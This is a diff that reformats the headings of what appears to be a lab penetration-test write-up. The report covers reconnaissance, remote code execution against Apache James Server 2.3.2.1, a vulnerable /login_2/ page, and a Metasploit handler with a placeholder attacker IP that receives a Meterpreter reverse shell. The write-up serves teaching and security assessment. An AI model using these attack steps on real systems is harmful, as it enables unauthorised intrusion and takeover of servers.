@@ -130,9 +130,11 @@ The following table summarizes the most interesting services found during the sc
     
 - The operating system was identified as **Linux**, with a kernel version range between 3.2 and 4.14, commonly found in distributions such as Ubuntu 16.04 or similar.
 
-# 4-Pashe 2 - Vulnerability Analysis and Exploitation
+---
 
-**Attack Vector Selection**
+## 4. Phase 2 - Vulnerability Analysis and Exploitation
+
+### Attack Vector Selection
 
 Based on the reconnaissance findings, a strategic approach was devised to exploit the most promising vulnerabilities.
 
@@ -147,7 +149,7 @@ Based on the reconnaissance findings, a strategic approach was devised to exploi
 
 Exportar a Hojas de cálculo
 
-Exploitation of Apache James Server 2.3.2.1 (SMTP / POP3)
+### Exploitation of Apache James Server 2.3.2.1 (SMTP / POP3)
 
 The goal of this exploitation was to demonstrate a **Remote Code Execution (RCE)** in **Apache James Server 2.3.2.1** by abusing its email sending and receiving logic. The attack leveraged three exposed services:
 - *Port 4555:* James administration console.    
@@ -186,7 +188,7 @@ QUIT
 
 ![Captured Flag](/assets/images/posts/atrium-report/flag1.png )
 
-**Critical Vulnerability** — `/login_2/`
+### Critical Vulnerability — `/login_2/`
 
 - **Location:** `http://192.168.0.1X/login_2/`
     
@@ -285,7 +287,6 @@ set LHOST <attacker_IP>
 set LPORT 4444
 run -j
 ```
-
 Once executed on the victim, the handler caught the connection, and a **Meterpreter session** was successfully established.
 
 ![System acces granted](/assets/images/posts/atrium-report/startmsf.png )
@@ -294,9 +295,9 @@ Once executed on the victim, the handler caught the connection, and a **Meterpre
 
 ---
 
-# 5. Phase 3: Post-Exploitation and Privilege Escalation
+## 5. Phase 3: Post-Exploitation and Privilege Escalation
 
-**Initial Context**
+### Initial Context
 
 The primary goal was to escalate privileges from the low-privileged `www-data` user to `root`.
 
